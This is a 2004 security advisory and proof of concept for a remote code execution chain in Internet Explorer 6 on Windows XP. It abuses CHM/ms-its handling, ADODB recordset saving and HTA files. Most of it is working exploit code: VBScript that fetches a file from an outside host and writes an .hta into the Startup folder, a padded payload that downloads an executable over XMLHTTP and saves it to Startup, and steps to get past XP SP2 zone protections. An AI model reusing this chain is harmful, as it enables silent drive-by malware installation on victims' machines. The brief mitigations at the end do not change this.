Microsoft Internet Explorer ms-its scheme/CHM remote code execution

Oct, 24 2004


Vulnerable
----------
- Microsoft Internet Explorer 6.0 (lower was not tested)
- Microsoft Windows XP Pro
- Microsoft Windows XP Home
- Microsoft Windows 2003 Server Enterprise


not tested if vulnerable
------------------------
- Microsoft Windows 98
- Microsoft Internet Explorer 5.x


Not Vulnerable
--------------
- Microsoft Windows 2000
- Microsoft Windows 2000 Server


Severity
---------
Critical - Remote code execution, little user intervention


In English
----------
   You can run executable code with a series of html codes on a XP system.  Its getting harder and harder these days so be ready for a long confusing paper. I am posting this proof of concept because as most of us know Microsoft will dismiss the last advisory (from http-equiv) and not provide us with patches for months and maybe years.


Tech Stuff and Explanation
--------------------------
http://www.michaelevanchik.com/kara/scrolll/files.zip <-- download all files here

1. Create a image file with the following source code that http-equiv gave us into a comment section on a image file.  I used Photoshop in the file menu > file info > comment field.  From there I saved the file as a jpeg file and then renamed it to malwarez6.mcb

Here is the code http-equiv gave us, i just changed it around to inject the hta file into start up instead.  

<script language="vbs">
Dim Conn, rs
Set Conn = CreateObject("ADODB.Connection")
Conn.Open "Driver={Microsoft Text Driver (*.txt; *.csv)};" & _
"Dbq=http://arite.zapto.org;" & _
"Extensions=asc,csv,tab,txt;" & _
"Persist Security Info=False"
Dim sql
sql = "SELECT * from foobar.txt"
set rs = conn.execute(sql)
set rs =CreateObject("ADODB.recordset")
rs.Open "SELECT * from foobar.txt", conn
rs.Save "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\real scheduler.hta", adPersistXML
rs.close
conn.close
</script>


There is one thing you need to know about this code.  Oddly �select * from foobar.txt� not only runs a GET command for �foobar.txt� on the web server, it also logs in anonymous to a FTP server on the same host.  If your server does not allow both, the vulnerability will not work.



2.  foobar.txt was the most difficult part of for me.  From the information http-equiv gave us, it seems this vulnerability could have been dismissed since you could not fit enough scriptable code into the hta file without the script compiler erroring due to binary asci code messing up the vbscript.  What I uncovered was this text file needed to be in a comma delimited format.  Not only that each side of each line of code needed to be padded with a dummy variable to keep the code "alive" so it would not error.  Notice the variable "crap" and the first and last lines where also dummies which the code would not have worked without.  HTA files are still a BIG whole for microsoft.  All the patching they have done to exploits, and the creation of xp service pack 2 was gods sent, but yet HTA files do not apply to ANY of these new features.  So I ended up putting an old and easy exe running exploit inside this hta file.

foobar.txt
-----------------------------------------
"meaning less shit i had to put here"
"<script language=vbscript> crap = """
""": on error resume next: crap = """
""" : set o = CreateObject(""msxml2.XMLHTTP"") : crap="""
""" : o.open ""GET"",""http://hometown.aol.com/mcbain/calc.exe"",False : crap="""
""" : o.send : crap="""
""" : set s = createobject(""adodb.stream"") : crap="""
""" : s.type=1 : crap="""
""" : s.open : crap="""
""" : s.write o.responseBody : crap="""
""" : s.savetofile ""C:\Documents and Settings\All Users\Start Menu\Programs\Startup\RealAudio.exe"",2 : crap="""
"""</script> crap="""
--------------end foobar.txt--------------------


3. In index.html notice the following key code:

<img id="dyn" src="malwarez6.mcb" border="0">


According to http-equiv's (malware.com) post he was using a file with no extension.  This did not work for me on IIS server so I used an extension that was not used (.mcb).  From there in IIS management console I added this mime type manually (.mcb   text/html) entry.  This image now gets by microsoft�s patch of not allowing executable content to be "draggable".  Microsoft seems to check ( no matter what extension of the file u use, or content type your http server sends) the file internally to see if it is not an executable file. 


4.  create a file cigar.hhk.  The code in this file is self explanatory


5.  create  frame.html.    Most somewhat self explanatory, though note the following code..

 <OBJECT style="height:650" style="width:250"id="hhctrl" type="application/x-oleobject" classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11"codebase="hhctrl.ocx#Version=5,2,3790,1194"width=7% height=7% style="position:absolute;top:140;left:72;z-index:100;">
    <PARAM name="Command" value="Index">
    <PARAM name="Item1" value="cigar.hhk">click me
</OBJECT>  

I could not get this object auto clicked with hhctrl.click() unfortunately, for now this is the only user intervention part.  But when a user click this object, it runs the html file in local zone, bypassing XP Service pack 2 for the second time in this exploit.


6.  Upload hhtctrl.ocx for the computers that don�t happen to have this control.  All XP's seem to have this by default, some win2k3's do not




Proof of Concept?
----------------
- http://www.michaelevanchik.com/kara/scrolll/index.html

- scroll down on this webpage and click the display button as directed.

- you will then notice a hta file in your start > programs > start up > real sceduler.hta

- from here when that is run you will get Real Audio.exe, alternatively the hta file is basically remote execution at that point anyway.





Vendor Recommendations
---------------------
- Microsoft needs to apply XP Service Pack 2's local zone exploit lockdown to .HTA files as well

- Microsoft should disable adodb.recordsets   .save method for writing to hard drives.

- As always Microsoft should pay BETTER people to test their software instead of rewards for
  virus writers

- Microsoft should not dismiss any vulnerabilities as "not a vulnerability itself" problems
  since if combined with other "not a vulnerability itself" bugs lead to THE PROBLEM



Temp Fix
-------------
- Disable hta files.
- Disable scripting in Internet Explorer
- Do not use Internet Explorer, use Mozilla Firebird (now known as FireFox  www.mozilla.org)


Credit
------
Http equiv - without him, i wouldn�t have a clue

mikx - http://www.mikx.de/scrollbar/  for his genius killer scrollbars!


Greets
------
- slacker my other brain
- illwill at illmob.org
- abe,rain and dolan


Contact
-------
Mike@MichaelEvanchik.com
http://www.MichaelEvanchik.com - me

http://Software.High-Pow-er.com - Need a professional programmer?
http://www.High-Pow-er.com - Other, Security, Consulting



